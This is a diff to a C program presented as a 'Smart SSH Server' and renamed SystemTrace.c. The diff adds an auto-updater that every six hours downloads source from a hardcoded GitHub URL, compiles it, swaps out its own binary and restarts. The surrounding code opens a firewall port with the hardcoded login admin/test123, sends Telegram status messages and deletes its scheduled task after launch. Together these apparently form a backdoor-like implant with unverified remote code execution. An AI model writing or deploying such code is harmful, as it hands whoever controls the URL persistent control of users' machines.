@@ -1,11 +1,10 @@
 /*
  * Smart SSH Server - High Performance C Version
- * Features: Auto-start, Battery monitoring, Shutdown detection, 
- *          GitHub updates, Telegram notifications via curl
+ * Auto-updating from: https://raw.githubusercontent.com/Abo5/sys-tools/main/SystemTrace.c
  * 
  * Compile:
- * Windows: gcc -o sshserver.exe smartssh.c -lcurl -ljson-c -lws2_32 -DWIN32
- * Linux:   gcc -o sshserver smartssh.c -lcurl -ljson-c -lpthread
+ * Windows: gcc -o sshserver.exe SystemTrace.c -lcurl -lws2_32 -static
+ * Linux:   gcc -o sshserver SystemTrace.c -lcurl -lpthread
  */
 
 #include <stdio.h>
@@ -42,10 +41,13 @@
 #define SSH_PORT 2222
 #define SSH_USER "admin"
 #define SSH_PASSWORD "test123"  // Change this!
-#define GITHUB_OWNER "YOUR_USERNAME"
-#define GITHUB_REPO "sshserver"
-#define TELEGRAM_BOT_TOKEN "YOUR_BOT_TOKEN"
-#define TELEGRAM_CHAT_ID "YOUR_CHAT_ID"
+
+// Update URL for self-updating
+#define UPDATE_URL "https://raw.githubusercontent.com/Abo5/sys-tools/main/SystemTrace.c"
+
+// Telegram settings
+#define TELEGRAM_BOT_TOKEN "YOUR_BOT_TOKEN"  // Change this
+#define TELEGRAM_CHAT_ID "YOUR_CHAT_ID"      // Change this
 
 // Global state
 static volatile int g_running = 1;
@@ -83,11 +85,7 @@ static size_t http_write_callback(void *contents, size_t size, size_t nmemb, str
 
 // Cross-platform execute command
 int execute_command(const char *command) {
-#ifdef WIN32
     return system(command);
-#else
-    return system(command);
-#endif
 }
 
 // ======================================================
@@ -144,6 +142,225 @@ void send_telegram_message(const char *message) {
         curl_slist_free_all(headers);
         curl_easy_cleanup(curl);
     }
+}
+
+// ======================================================
+// Self-Update System
+// ======================================================
+
+// Extract version from source code
+char* extract_version_from_source(const char *source_code) {
+    static char version[32];
+    version[0] = '\0';
+    
+    char *define_line = strstr(source_code, "#define VERSION");
+    if (define_line) {
+        char *quote1 = strchr(define_line, '"');
+        if (quote1) {
+            quote1++;
+            char *quote2 = strchr(quote1, '"');
+            if (quote2) {
+                int len = quote2 - quote1;
+                if (len < sizeof(version) - 1) {
+                    strncpy(version, quote1, len);
+                    version[len] = '\0';
+                    return version;
+                }
+            }
+        }
+    }
+    return NULL;
+}
+
+// Download source code from GitHub
+int download_source_code(char **source_code, size_t *source_size) {
+    CURL *curl;
+    CURLcode res;
+    struct http_response response = {0};
+    
+    curl = curl_easy_init();
+    if (!curl) return 0;
+    
+    curl_easy_setopt(curl, CURLOPT_URL, UPDATE_URL);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http_write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
+    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+    
+    res = curl_easy_perform(curl);
+    curl_easy_cleanup(curl);
+    
+    if (res != CURLE_OK || !response.data) {
+        if (response.data) free(response.data);
+        return 0;
+    }
+    
+    *source_code = response.data;
+    *source_size = response.size;
+    return 1;
+}
+
+// Compile new binary from source
+int compile_new_binary(const char *source_code, const char *new_binary_path) {
+    // Write source to temporary file
+    char temp_source[256];
+    snprintf(temp_source, sizeof(temp_source), "SystemTrace_new.c");
+    
+    FILE *f = fopen(temp_source, "w");
+    if (!f) return 0;
+    
+    fputs(source_code, f);
+    fclose(f);
+    
+    // Compile the new version
+    char compile_command[1024];
+#ifdef WIN32
+    snprintf(compile_command, sizeof(compile_command), 
+        "gcc -O2 -o \"%s\" \"%s\" -lcurl -lws2_32 -static 2>compile_error.log", 
+        new_binary_path, temp_source);
+#else
+    snprintf(compile_command, sizeof(compile_command), 
+        "gcc -O2 -o \"%s\" \"%s\" -lcurl -lpthread 2>compile_error.log", 
+        new_binary_path, temp_source);
+#endif
+    
+    int result = execute_command(compile_command);
+    
+    // Cleanup temp files
+    unlink(temp_source);
+    if (result != 0) {
+        printf("[UPDATE] Compilation failed. Check compile_error.log\n");
+        return 0;
+    }
+    
+    unlink("compile_error.log");
+    return 1;
+}
+
+// Test new binary
+int test_new_binary(const char *binary_path) {
+    char test_command[512];
+    snprintf(test_command, sizeof(test_command), "\"%s\" --check 2>/dev/null", binary_path);
+    return execute_command(test_command) == 0;
+}
+
+// Perform self-update
+int perform_self_update() {
+    printf("[UPDATE] Checking for updates from GitHub...\n");
+    
+    char *source_code = NULL;
+    size_t source_size = 0;
+    
+    // Download source
+    if (!download_source_code(&source_code, &source_size)) {
+        printf("[UPDATE] Failed to download source code\n");
+        return 0;
+    }
+    
+    printf("[UPDATE] Downloaded %zu bytes of source code\n", source_size);
+    
+    // Extract version
+    char *remote_version = extract_version_from_source(source_code);
+    if (!remote_version) {
+        printf("[UPDATE] Could not extract version from source\n");
+        free(source_code);
+        return 0;
+    }
+    
+    printf("[UPDATE] Current: %s, Remote: %s\n", VERSION, remote_version);
+    
+    // Check if update needed
+    if (strcmp(VERSION, remote_version) == 0) {
+        printf("[UPDATE] Already on latest version\n");
+        free(source_code);
+        return 1;
+    }
+    
+    printf("[UPDATE] New version available: %s → %s\n", VERSION, remote_version);
+    
+    // Get current executable path
+    char current_path[1024];
+    char new_path[1024];
+    char backup_path[1024];
+    
+#ifdef WIN32
+    GetModuleFileNameA(NULL, current_path, sizeof(current_path));
+    snprintf(new_path, sizeof(new_path), "%s.new", current_path);
+    snprintf(backup_path, sizeof(backup_path), "%s.backup", current_path);
+#else
+    if (readlink("/proc/self/exe", current_path, sizeof(current_path)) == -1) {
+        printf("[UPDATE] Could not get current executable path\n");
+        free(source_code);
+        return 0;
+    }
+    snprintf(new_path, sizeof(new_path), "%s.new", current_path);
+    snprintf(backup_path, sizeof(backup_path), "%s.backup", current_path);
+#endif
+    
+    // Compile new version
+    printf("[UPDATE] Compiling new version...\n");
+    if (!compile_new_binary(source_code, new_path)) {
+        printf("[UPDATE] Compilation failed\n");
+        free(source_code);
+        return 0;
+    }
+    
+    free(source_code);
+    
+    // Test new binary
+    printf("[UPDATE] Testing new binary...\n");
+    if (!test_new_binary(new_path)) {
+        printf("[UPDATE] New binary failed tests\n");
+        unlink(new_path);
+        return 0;
+    }
+    
+    // Backup current binary
+    printf("[UPDATE] Creating backup...\n");
+    unlink(backup_path); // Remove old backup
+    if (rename(current_path, backup_path) != 0) {
+        printf("[UPDATE] Failed to create backup\n");
+        unlink(new_path);
+        return 0;
+    }
+    
+    // Install new binary
+    printf("[UPDATE] Installing new version...\n");
+    if (rename(new_path, current_path) != 0) {
+        printf("[UPDATE] Failed to install new version, restoring backup\n");
+        rename(backup_path, current_path); // Restore backup
+        unlink(new_path);
+        return 0;
+    }
+    
+    // Make executable (Linux)
+#ifndef WIN32
+    chmod(current_path, 0755);
+#endif
+    
+    printf("[UPDATE] ✓ Successfully updated to version %s\n", remote_version);
+    
+    // Send notification
+    char update_msg[256];
+    snprintf(update_msg, sizeof(update_msg), 
+        "🔄 <b>Auto-Update Complete</b>\nVersion: %s → %s\nRestarting server...", 
+        VERSION, remote_version);
+    send_telegram_message(update_msg);
+    
+    // Restart
+    printf("[UPDATE] Restarting with new version...\n");
+    sleep(1);
+    
+#ifdef WIN32
+    char restart_cmd[1024];
+    snprintf(restart_cmd, sizeof(restart_cmd), "\"%s\" smart", current_path);
+    system(restart_cmd);
+#else
+    char *args[] = {current_path, "smart", NULL};
+    execv(current_path, args);
+#endif
+    
+    exit(0); // Should not reach here
 }
 
 // ======================================================
@@ -315,7 +532,6 @@ int disable_firewall() {
         "powershell -NoProfile -Command \"Remove-NetFirewallRule -DisplayName 'SmartSSH-%d'\"", SSH_PORT);
     return execute_command(command) == 0;
 #else
-    // Leave for admin to manage on Linux
     return 1;
 #endif
 }
@@ -357,7 +573,6 @@ struct battery_info get_battery_info() {
 
 int is_shutdown_pending() {
 #ifdef WIN32
-    // Check for shutdown/restart processes
     char command[] = "powershell -NoProfile -Command \"Get-Process | Where-Object {$_.ProcessName -match 'shutdown|restart'} | Measure-Object | Select-Object -ExpandProperty Count\" > shutdown_check.tmp";
     
     if (execute_command(command) == 0) {
@@ -375,102 +590,10 @@ int is_shutdown_pending() {
     }
     return 0;
 #else
-    // Check for shutdown/reboot processes on Linux
     return (execute_command("pgrep shutdown >/dev/null 2>&1") == 0 ||
             execute_command("pgrep reboot >/dev/null 2>&1") == 0 ||
             execute_command("pgrep poweroff >/dev/null 2>&1") == 0);
 #endif
-}
-
-// ======================================================
-// GitHub update checker
-// ======================================================
-
-struct github_release {
-    char tag_name[64];
-    char download_url[512];
-};
-
-int check_github_update(struct github_release *release) {
-    if (strcmp(GITHUB_OWNER, "YOUR_USERNAME") == 0) {
-        return 0; // Not configured
-    }
-    
-    CURL *curl;
-    CURLcode res;
-    struct http_response response = {0};
-    char url[256];
-    
-    snprintf(url, sizeof(url), "https://api.github.com/repos/%s/%s/releases/latest", GITHUB_OWNER, GITHUB_REPO);
-    
-    curl = curl_easy_init();
-    if (!curl) return 0;
-    
-    curl_easy_setopt(curl, CURLOPT_URL, url);
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http_write_callback);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
-    
-    res = curl_easy_perform(curl);
-    curl_easy_cleanup(curl);
-    
-    if (res != CURLE_OK || !response.data) {
-        if (response.data) free(response.data);
-        return 0;
-    }
-    
-    // Simple JSON parsing (looking for tag_name and download_url)
-    char *tag_start = strstr(response.data, "\"tag_name\":");
-    if (tag_start) {
-        tag_start = strchr(tag_start, '"');
-        if (tag_start) {
-            tag_start = strchr(tag_start + 1, '"') + 1;
-            char *tag_end = strchr(tag_start, '"');
-            if (tag_end) {
-                int len = tag_end - tag_start;
-                if (len < sizeof(release->tag_name)) {
-                    strncpy(release->tag_name, tag_start, len);
-                    release->tag_name[len] = '\0';
-                }
-            }
-        }
-    }
-    
-    // Look for appropriate binary
-    char target[128];
-#ifdef WIN32
-    snprintf(target, sizeof(target), "sshserver-windows-amd64.exe");
-#else
-    snprintf(target, sizeof(target), "sshserver-linux-amd64");
-#endif
-    
-    char *asset_start = strstr(response.data, target);
-    if (asset_start) {
-        char *url_start = asset_start;
-        for (int i = 0; i < 5 && url_start; i++) {
-            url_start = strstr(url_start, "browser_download_url");
-            if (url_start) {
-                url_start = strchr(url_start, '"');
-                if (url_start) {
-                    url_start = strchr(url_start + 1, '"') + 1;
-                    char *url_end = strchr(url_start, '"');
-                    if (url_end) {
-                        int len = url_end - url_start;
-                        if (len < sizeof(release->download_url)) {
-                            strncpy(release->download_url, url_start, len);
-                            release->download_url[len] = '\0';
-                            break;
-                        }
-                    }
-                }
-            }
-        }
-    }
-    
-    free(response.data);
-    
-    // Check if we have a newer version
-    return (strlen(release->tag_name) > 0 && strcmp(release->tag_name, VERSION) != 0);
 }
 
 // ======================================================
@@ -484,12 +607,13 @@ void handle_ssh_connection(SOCKET client_socket) {
     snprintf(response, sizeof(response), "SSH-2.0-SmartSSH_%s\r\n", VERSION);
     send(client_socket, response, strlen(response), 0);
     
-    // Read client banner
     recv(client_socket, buffer, sizeof(buffer) - 1, 0);
     
     snprintf(response, sizeof(response), 
         "Welcome to Smart SSH Server %s\r\n"
-        "This is a demo server - use OpenSSH for full access\r\n", VERSION);
+        "Update from: %s\r\n"
+        "This is a demo server - use OpenSSH for full access\r\n", 
+        VERSION, UPDATE_URL);
     send(client_socket, response, strlen(response), 0);
     
     sleep(2);
@@ -626,7 +750,35 @@ void* shutdown_monitor_thread(void* param) {
 }
 
 // ======================================================
-// Signal handlers
+// Auto-update monitor
+// ======================================================
+
+#ifdef WIN32
+DWORD WINAPI update_monitor_thread(LPVOID param) {
+#else
+void* update_monitor_thread(void* param) {
+#endif
+    // Wait 5 minutes before first update check
+    sleep(300);
+    
+    while (g_running) {
+        // Check for updates every 6 hours
+        printf("[UPDATE] Checking for updates...\n");
+        if (perform_self_update()) {
+            // If update was successful, the process restarts
+            // If we're here, no update was needed
+        }
+        
+        // Wait 6 hours (21600 seconds) before next check
+        for (int i = 0; i < 21600 && g_running; i++) {
+            sleep(1);
+        }
+    }
+    return 0;
+}
+
+// ======================================================
+// Signal handlers and cleanup
 // ======================================================
 
 void signal_handler(int signum) {
@@ -669,20 +821,38 @@ int main(int argc, char *argv[]) {
     g_start_time = time(NULL);
     
     if (argc < 2) {
-        printf("Smart SSH Server v%s (C Version)\n", VERSION);
+        printf("Smart SSH Server v%s (Self-Updating C Version)\n", VERSION);
+        printf("Update URL: %s\n", UPDATE_URL);
         printf("\nUsage:\n");
-        printf("  %s smart    - Smart mode with all monitoring\n", argv[0]);
+        printf("  %s smart    - Smart mode with auto-updates\n", argv[0]);
         printf("  %s setup    - Setup auto-start service\n", argv[0]);
-        printf("  %s update   - Check for updates\n", argv[0]);
+        printf("  %s update   - Manual update check\n", argv[0]);
+        printf("  %s --check  - Test command (for update validation)\n", argv[0]);
+        printf("  %s --version - Show version\n", argv[0]);
         return 1;
     }
     
     // Initialize curl globally
     curl_global_init(CURL_GLOBAL_DEFAULT);
     
-    if (strcmp(argv[1], "smart") == 0) {
+    if (strcmp(argv[1], "--check") == 0) {
+        printf("OK\n");
+        return 0;
+    } else if (strcmp(argv[1], "--version") == 0) {
+        printf("Smart SSH Server v%s\n", VERSION);
+        printf("Build: %s\n", 
+#ifdef WIN32
+            "Windows"
+#else
+            "Linux"
+#endif
+        );
+        printf("Update URL: %s\n", UPDATE_URL);
+        return 0;
+    } else if (strcmp(argv[1], "smart") == 0) {
         printf("========================================\n");
-        printf("  Smart SSH Server v%s (C Version)\n", VERSION);
+        printf("  Smart SSH Server v%s\n", VERSION);
+        printf("  Self-Updating C Version\n");
         printf("========================================\n");
         
         // Setup signal handlers
@@ -691,25 +861,30 @@ int main(int argc, char *argv[]) {
         atexit(cleanup_and_exit);
         
         // Send startup notification
-        char startup_msg[256];
-        snprintf(startup_msg, sizeof(startup_msg), "🚀 <b>Smart SSH Server Started</b>\nVersion: %s (C)\nOS: %s\nPort: %d", 
-                 VERSION, 
+        char startup_msg[512];
+        snprintf(startup_msg, sizeof(startup_msg), 
+            "🚀 <b>Smart SSH Server Started</b>\n"
+            "Version: %s (C)\n"
+            "OS: %s\n"
+            "Port: %d\n"
+            "Update URL: %s", 
+            VERSION, 
 #ifdef WIN32
-                 "Windows",
+            "Windows",
 #else
-                 "Linux",
+            "Linux",
 #endif
-                 SSH_PORT);
+            SSH_PORT, UPDATE_URL);
         send_telegram_message(startup_msg);
         
-        printf("\n[1/5] Enabling firewall...\n");
+        printf("\n[1/6] Enabling firewall...\n");
         if (enable_firewall()) {
             printf("✓ Opened port %d\n", SSH_PORT);
         } else {
             printf("⚠ Firewall setup warning\n");
         }
         
-        printf("\n[2/5] Starting SSH server...\n");
+        printf("\n[2/6] Starting SSH server...\n");
 #ifdef WIN32
         CreateThread(NULL, 0, ssh_server_thread, NULL, 0, NULL);
 #else
@@ -718,7 +893,7 @@ int main(int argc, char *argv[]) {
 #endif
         printf("✓ SSH server ready\n");
         
-        printf("\n[3/5] Starting shutdown monitor...\n");
+        printf("\n[3/6] Starting shutdown monitor...\n");
 #ifdef WIN32
         CreateThread(NULL, 0, shutdown_monitor_thread, NULL, 0, NULL);
 #else
@@ -727,14 +902,23 @@ int main(int argc, char *argv[]) {
 #endif
         printf("✓ Shutdown detection active\n");
         
-        printf("\n[4/5] Task cleanup in 10 seconds...\n");
+        printf("\n[4/6] Starting auto-update monitor...\n");
+#ifdef WIN32
+        CreateThread(NULL, 0, update_monitor_thread, NULL, 0, NULL);
+#else
+        pthread_t update_thread;
+        pthread_create(&update_thread, NULL, update_monitor_thread, NULL);
+#endif
+        printf("✓ Auto-update every 6 hours\n");
+        
+        printf("\n[5/6] Task cleanup in 10 seconds...\n");
         sleep(10);
         if (is_task_registered()) {
             unregister_task();
             printf("[CLEANUP] ✓ Removed Task Scheduler (running in memory)\n");
         }
         
-        printf("\n[5/5] Starting battery monitoring...\n");
+        printf("\n[6/6] Starting battery monitoring...\n");
 #ifdef WIN32
         CreateThread(NULL, 0, battery_monitor_thread, NULL, 0, NULL);
         printf("✓ Battery monitoring active\n");
@@ -742,16 +926,18 @@ int main(int argc, char *argv[]) {
         printf("✓ Battery monitoring (Windows only)\n");
 #endif
         
-        printf("\n" "================================================" "\n");
+        printf("\n================================================\n");
         printf("  SSH Server ready on port %d\n", SSH_PORT);
         printf("  ✓ Shutdown detection active\n");
         printf("  ✓ Auto-save on emergency\n");
+        printf("  ✓ Auto-update every 6 hours\n");
         printf("  ✓ Smart firewall management\n");
-        printf("  ✓ Telegram notifications active\n");
+        printf("  ✓ Telegram notifications\n");
         printf("  • To stop: Ctrl+C\n");
         printf("  • To connect: ssh -p %d %s@<IP>\n", SSH_PORT, SSH_USER);
         printf("  • Password: %s\n", SSH_PASSWORD);
-        printf("================================================" "\n");
+        printf("  • Manual update: %s update\n", argv[0]);
+        printf("================================================\n");
         
         // Main loop
         while (g_running) {
@@ -776,18 +962,8 @@ int main(int argc, char *argv[]) {
         printf("Setup complete!\n");
         
     } else if (strcmp(argv[1], "update") == 0) {
-        printf("Checking for updates from GitHub...\n");
-        
-        struct github_release release;
-        memset(&release, 0, sizeof(release));
-        
-        if (check_github_update(&release)) {
-            printf("New update available: %s → %s\n", VERSION, release.tag_name);
-            printf("Download URL: %s\n", release.download_url);
-            // Note: Auto-download and replace would be implemented here
-        } else {
-            printf("✓ Already on latest version: %s\n", VERSION);
-        }
+        printf("Manual update check...\n");
+        perform_self_update();
         
     } else {
         printf("Unknown command: %s\n", argv[1]);
